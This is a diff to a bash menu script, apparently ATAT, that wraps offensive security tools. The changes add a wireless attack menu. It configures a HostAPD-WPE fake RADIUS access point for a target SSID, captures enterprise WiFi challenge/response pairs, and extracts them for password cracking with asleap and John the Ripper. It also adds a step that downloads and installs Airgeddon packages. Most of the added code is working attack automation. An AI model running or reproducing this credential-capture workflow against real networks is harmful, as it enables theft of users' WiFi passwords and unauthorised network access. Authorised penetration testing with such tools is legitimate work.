@@ -185,11 +185,12 @@ echo -e "\E[1;34m:::\e[97m[6] \e[90mMulti-Target Exploit \e[97m [Fire 1 Exploit 
 tput sgr0                               # Reset attributes.
 echo -e "\E[1;34m===\e[97m[7] \e[32mAuxiliary & Scanning \e[97m [Run Auxiliary & Scans @ Many Targets/Ports]  \E[1;34m"
 tput sgr0
-#echo -e "\E[1;34m:::\e[97m[8] \e[34mMulti-Port Auxiliary \e[97m [Run 1 Auxiliary Module Against Many Ports]  \E[1;34m"
-#tput sgr0
-
-#echo -e "\E[1;34m:::\e[97m[10]\e[31mMulti-Target Java JMX \e[97m[Fire 1 JMX Exploit at Many Targets]   \E[1;34m"
-#tput sgr0
+echo -e "\E[1;34m:::\e[97m[8] \e[34mDependency Checker    \e[97m[Check For Dependencies]   \E[1;34m"
+tput sgr0
+echo -e "\E[1;34m===\e[97m[9] \e[95mEmpire & DeathStar  \e[97m  [Pledge Your Allegiance to The Empire]   \E[1;34m"
+tput sgr0
+echo -e "\E[1;34m:::\e[97m[10]\e[31mWireless Attacks      \e[97m[Rule The Airwaves]   \E[1;34m"
+tput sgr0
 #echo -e "\E[1;34m===\e[97m[11]\e[90mMulti-Target Java RMI \e[97m[Fire 1 RMI Exploit at Many Targets]   \E[1;34m"
 #tput sgr0
 #echo -e "\E[1;34m:::\e[97m[12]\e[32mMulti-Target SNMP Enum\e[97m[SNMP Enumerate Many Targets]   \E[1;34m"
@@ -200,10 +201,6 @@ tput sgr0
 #tput sgr0
 #echo -e "\E[1;34m===\e[97m[15]\e[31mMasscan All TCP Ports \e[97m[Masscan all TCP Ports on Many Targets]   \E[1;34m"
 #tput sgr0
-echo -e "\E[1;34m:::\e[97m[8] \e[34mDependency Checker    \e[97m[Check For Dependencies]   \E[1;34m"
-tput sgr0
-echo -e "\E[1;34m===\e[97m[9] \e[95mEmpire & DeathStar  \e[97m  [Pledge Your Allegiance to The Empire]   \E[1;34m"
-tput sgr0
 echo -e "\E[1;34m::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
 echo -e "\e[97m~~~~~~~~~~~~~~~~~~ \e[31mProps to rand0m1ze for the concept!\e[97m~~~~~~~~~~~~~~~~~~\e[31m"
 tput sgr0
@@ -824,7 +821,6 @@ select opt in "${options[@]}"
 	do
 	masscan $IP -p0-65535 --rate 1000 | tee $outputfile
 	cat $outputfile | egrep "Discovered open port" | grep -B1 open >> Open_Ports.txt
-#	awk -F'/' '{ print $2 ":" $1 }' output.txt | awk '{print $3}'
 	sed "/Discovered open port /s/Discovered open port /""/g" ~masscan_results.txt > ~masscan_results1.txt
 	awk -F/ '{ print $2 ":" $1 }' ~masscan_results1.txt > ~masscan_results2.txt
 	sed "/tcp on /s/tcp on /""/g" ~masscan_results2.txt >> ~masscan_results3.txt
@@ -875,8 +871,8 @@ done
   echo -e "\E[1;34m::::: \e[97mCheck for Dependencies\E[1;34m:::::"
   echo -e "\E[1;34m::::: \e[97mPowershell Empire & DeathStar Option Should Only Be Run If You Are Logged In As root!!\E[1;34m:::::"
 
-PS3='Enter your choice: ENTER=Options Menu | 4=Main Menu | 5=QUIT: '
-options=("Powershell Empire & DeathStar" "Dependencies" "DBD Installer" "Main Menu" "Quit")
+PS3='Enter your choice: ENTER=Options Menu | 5=Main Menu | 6=QUIT: '
+options=("Powershell Empire & DeathStar" "Dependencies" "DBD Installer" "Airgeddon Install Workaround" "Main Menu" "Quit") #"HostAPD-WPE via Github"
 select opt in "${options[@]}"
 do
     case $opt in
@@ -904,7 +900,7 @@ do
 		mkdir /tmp/ATAT/
 		echo ""
 
-	reqs="gcc gcc-mingw-w64-i686 curl jq"
+	reqs="gcc gcc-mingw-w64-i686 curl jq bettercap libssl-dev libnl-genl-3-dev hostapd-wpe lynx airgeddon hostapd lighttpd asleap"
 	for i in $reqs; do
 		dpkg -s "$i" &> /tmp/ATAT/$i-install.txt
 		isinstalled=$(cat /tmp/ATAT/$i-install.txt | grep -o "Status: install ok installed")
@@ -962,6 +958,27 @@ do
 			echo ""
 			sleep 3
 	fi
+			;;
+		#"HostAPD-WPE via Github")
+		#git clone https://github.com/OpenSecurityResearch/hostapd-wpe ~/hostapd-wpe
+		#wget https://w1.fi/releases/hostapd-2.6.tar.gz ~/hostapd-2.6.tar.gz
+		#tar -xvf ~/hostapd-2.6.tar
+		#cd ~/hostapd-2.6
+		#patch -p1 < ../hostapd-wpe/hostapd-wpe.patch
+		#cd hostapd
+		#make cd ../ ../hostapd-wpe/certs ./bootstrap
+		#echo -e "\e[1;34m[*] Installing & Patching HostAPD-WPE ...\e[0m\n"
+			#;;
+		"Airgeddon Install Workaround")
+		rm airgeddon_*_all.deb airgeddon.deb
+		wget https://raw.githubusercontent.com/v1s1t0r1sh3r3/airgeddon/master/binaries/kali/airgeddon_{8..10}.{0..4}{0..4}-{0..3}_all.deb 
+        #The above command will need to be periodically updated as the major version goes beyond 8-10. This is hacky and terribly wasteful from a resource perspective; but will do for the time being.
+        mv airgeddon_*_all.deb airgeddon.deb
+		chmod +x airgeddon.deb
+		dpkg -i airgeddon.deb
+		echo -e "\e[1;34m[*] Installing Airgeddon ...\e[0m\n"
+		echo -e "\e[1;34m[*] If Airgeddon Workaround fails, manually navigate to https://github.com/v1s1t0r1sh3r3/airgeddon/tree/master/binaries/kali/ ...\e[0m\n"
+		echo -e "\e[1;34m[*] Download Current airgeddon_#.##-#_all.deb file, then run with e[31m dpkg -i airgeddon*.deb\e[97m...\e[0m\n"
 			;;
 		"Main Menu")
             ~/ATAT/ATAT.sh
@@ -1127,6 +1144,97 @@ do
     esac
 done
 
+;;
+ "10" | "10" )
+         
+ echo -e "\E[1;34m::::: \e[97mWireless Attacks!!\E[1;34m:::::"
+ echo -e "\E[1;34m::::: \e[97mOption 1 MUST Be Run BEFORE Using The HostAPD-WPE Attack\E[1;34m:::::"
+ echo -e "\E[1;34m::::: \e[97mOption 2 MUST Be Run AFTER Using The HostAPD-WPE Attack To Allow WLAN NIC To Function Normally\E[1;34m:::::"
+ echo -e "\E[1;34m::::: \e[97m**WARNING** HostAPD-WPE Option Will *KILL ALL* Normal Network Connections For WLAN Interface Selected Until Option 2 Is Run!!\E[1;34m:::::"
+ 
+PS3='Enter your choice: ENTER=Options Menu | 7=Main Menu | 8=QUIT: '
+options=("Remove Wireless NIC from Network Manager" "Reset Wireless NIC for Network Manager Usage" "HostAPD-WPE Enterprise WiFi Fake RADIUS Server Attack" "Airgeddon" "Multi-Target Asleap Attack" "Multi-Target John The Ripper Attack" "Main Menu" "Quit")
+select opt in "${options[@]}"
+do
+    case $opt in
+		"Remove Wireless NIC from Network Manager")
+		#get MAC from wireless nic to be used in attack and add the MAC to /etc/NetworkManager/NetworkManager.conf (or where is best)
+		#[keyfile]
+		#unmanaged-devices=mac:00:11:22:33:44:55
+		echo -e "\E[1;34m::::: \e[97mCopy MAC address from the WLAN NIC interface you wish to use in your HostAPD-WPE attack\E[1;34m:::::"
+		ip addr
+		echo ""
+		echo -e "\E[1;34m::::: \e[97mFor ParrotOS & Distros That Auto Spoof MACs, Check 'Permanent MAC:' Value For Desired Interface To Be Sure You Have The Correct MAC. This WILL NOT WORK If You Enter A Spoofed MAC!\E[1;34m:::::"
+			read -p 'Enter WLAN NIC You Wish To Use (wlan0, wlan1, Etc.): ' userspnic;
+		macchanger -s $userspnic
+		echo -e "\E[1;34m::::: \e[97mPaste copied 'Permanent MAC' address from above into Set MAC for HostAPD-WPE Attacking WLAN NIC: prompt\E[1;34m:::::"
+			read -p 'Set MAC for HostAPD-WPE Attacking WLAN NIC: ' usermac;
+		mkdir -p /etc/NetworkManager/conf.d/
+		touch  /etc/NetworkManager/conf.d/NetworkManager.conf
+		echo [main] > /etc/NetworkManager/conf.d/NetworkManager.conf
+		echo plugins=ifupdown,keyfile >> /etc/NetworkManager/conf.d/NetworkManager.conf
+		echo  >> /etc/NetworkManager/conf.d/NetworkManager.conf
+		echo [ifupdown] >> /etc/NetworkManager/conf.d/NetworkManager.conf
+		echo managed=false >> /etc/NetworkManager/conf.d/NetworkManager.conf
+		echo  >> /etc/NetworkManager/conf.d/NetworkManager.conf
+		echo [keyfile] >> /etc/NetworkManager/conf.d/NetworkManager.conf
+		echo unmanaged-devices=mac:$usermac >> /etc/NetworkManager/conf.d/NetworkManager.conf
+		service NetworkManager restart	
+		    ;;
+		"Reset Wireless NIC for Network Manager Usage")
+		#get MAC from wireless nic used in attack and remove the MAC from /etc/NetworkManager/NetworkManager.conf (or where is best)
+		#[keyfile]
+		#unmanaged-devices=mac:00:11:22:33:44:55
+		rm /etc/NetworkManager/conf.d/NetworkManager.conf
+		service NetworkManager restart
+		    echo -e "\E[1;34m::::: \e[97mWireless NIC Reset To Managed Mode\E[1;34m:::::"
+		    ;;
+        "HostAPD-WPE Enterprise WiFi Fake RADIUS Server Attack")
+            read -p 'Set SSID for Target Network: ' userssid; read -p 'Set WLAN NIC Interface (wlan0, wlan1, etc.): ' usernic;
+	sed "/ssid=/s/hostapd-wpe/$userssid/g" /etc/hostapd-wpe/hostapd-wpe.conf > /etc/hostapd-wpe/hostapd-wpe1.conf
+	sed "/interface=/s/wlan0/$usernic/g" /etc/hostapd-wpe/hostapd-wpe1.conf > /etc/hostapd-wpe/hostapd-wpe2.conf
+	hostapd-wpe /etc/hostapd-wpe/hostapd-wpe2.conf | tee ~/ATAT/hostapd-wpe_output.txt
+	awk '$1 == "challenge:" {c=$2} $1 == "response:" {printf("-C %s -R %s\n", c, $2)}' ~/ATAT/hostapd-wpe_output.txt >> ~/ATAT/asleap_users.txt
+	awk '/jtr NETNTLM:/' ~/ATAT/hostapd-wpe_output.txt >> ~/ATAT/john_users.txt
+	sed -i "/jtr NETNTLM:/s/jtr NETNTLM:/""/g" ~/ATAT/john_users.txt
+	        echo -e "\E[1;34m::::: \e[97mRun Multi-Target Asleap or John The Ripper To Recover Passwords From Collected Challenge/Response Pairs\E[1;34m:::::"
+            ;;
+    "Airgeddon")
+    echo -e "\E[1;34m::::: \e[97mLaunching Airgeddon!!\E[1;34m:::::"
+	bash airgeddon
+            ;;
+    "Multi-Target Asleap Attack")
+    read -p 'Set Path To Wordlist: ' wordlist;
+    echo -e "\E[1;34m::::: \e[97mCracking Passwords!!\E[1;34m:::::"
+    inputfile=~/ATAT/asleap_users.txt
+	cat $inputfile | while read line
+	do
+	asleap $line -W $wordlist | tee  ~/ATAT/asleap_output.txt
+	cat ~/ATAT/asleap_output.txt >> ~/ATAT/asleap_cracked.txt
+	rm ~/ATAT/asleap_output.txt
+	done
+	        echo -e "\E[1;34m::::: \e[97mAsleap Output & All Cracked Passwords Located in ~/ATAT/asleap_cracked.txt\E[1;34m:::::"
+            ;;
+    "Multi-Target John The Ripper Attack")
+    read -p 'Set Path To Wordlist: ' wordlist;
+    echo -e "\E[1;34m::::: \e[97mCracking Passwords!!\E[1;34m:::::"
+    inputfile=~/ATAT/john_users.txt
+	john --wordlist $wordlist $inputfile | tee  ~/ATAT/john_output.txt
+	cat ~/ATAT/john_output.txt >> ~/ATAT/john_cracked.txt
+	rm ~/ATAT/john_output.txt
+	john --show ~/ATAT/john_users.txt >> ~/ATAT/john_cracked.txt
+	        echo -e "\E[1;34m::::: \e[97mJohn The Ripper Output & All Cracked Passwords Located in ~/ATAT/john_cracked.txt\E[1;34m:::::"
+            ;;                   
+        "Main Menu")
+            ~/ATAT/ATAT.sh
+            ;;
+        "Quit")
+            echo "Aufiederszehn" && exit 1
+            ;;
+        *) echo invalid option;;
+    esac
+done 
+  
 ;;
    
 esac
